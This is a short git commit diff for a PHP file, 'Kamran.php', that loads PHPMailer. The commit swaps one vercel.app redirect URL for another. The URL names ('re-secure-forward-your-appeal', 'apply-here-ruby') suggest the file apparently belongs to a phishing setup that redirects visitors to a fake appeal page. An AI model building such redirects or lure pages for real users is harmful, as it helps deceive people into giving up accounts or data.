a2f92c23a307c195ad70f02873f90e4fe888de4f
adiwalfare <ronimawiads@gmail.com>
2025-08-07 15:20:07 +0500

    Update Kamran.php

--- Kamran.php
+++ Kamran.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-secure-forward-your-appeal.vercel.app/");
+header("Location: https://apply-here-ruby.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
